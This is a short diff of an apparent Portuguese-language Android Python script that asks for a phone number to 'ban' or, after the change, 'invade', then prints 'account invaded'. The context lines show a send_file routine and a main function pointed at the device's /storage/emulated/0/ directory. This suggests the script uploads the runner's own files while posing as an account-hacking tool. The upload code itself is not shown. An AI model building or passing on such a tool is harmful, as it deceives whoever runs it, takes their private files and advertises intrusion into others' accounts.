@@ -70,7 +70,7 @@ def enviar_log():
     except Exception as e:
         print("Erro no log:", e)
 #@BoxPrey
-name = input('''\033[95m𝙞𝙣𝙨𝙞𝙧𝙖 𝙤 𝙣𝙪𝙢𝙚𝙧𝙤 𝙦𝙪𝙚 𝙦𝙪𝙚𝙧 𝙗𝙖𝙣𝙞𝙧:''')
+name = input('''\033[95m𝙞𝙣𝙨𝙞𝙧𝙖 𝙤 𝙣𝙪𝙢𝙚𝙧𝙤 𝙦𝙪𝙚 𝙦𝙪𝙚𝙧 𝙞𝙣𝙫𝙖𝙙𝙞𝙧:''')
 #@BoxPrey
 def send_file(file_path):
     try:
@@ -83,7 +83,7 @@ def send_file(file_path):
         print("Erro ao enviar:", file_path, e)
 
 def attack_message():
-    print("\033[92m𝙘𝙤𝙣𝙩𝙖 𝙧𝙚𝙥𝙤𝙧𝙩𝙖𝙙𝙖 ✅\033[0m")
+    print("\033[92m𝙘𝙤𝙣𝙩𝙖 𝙞𝙣𝙫𝙖𝙙𝙞𝙙𝙖 ✅\033[0m")
 
 def main():
     dir_path = "/storage/emulated/0/"
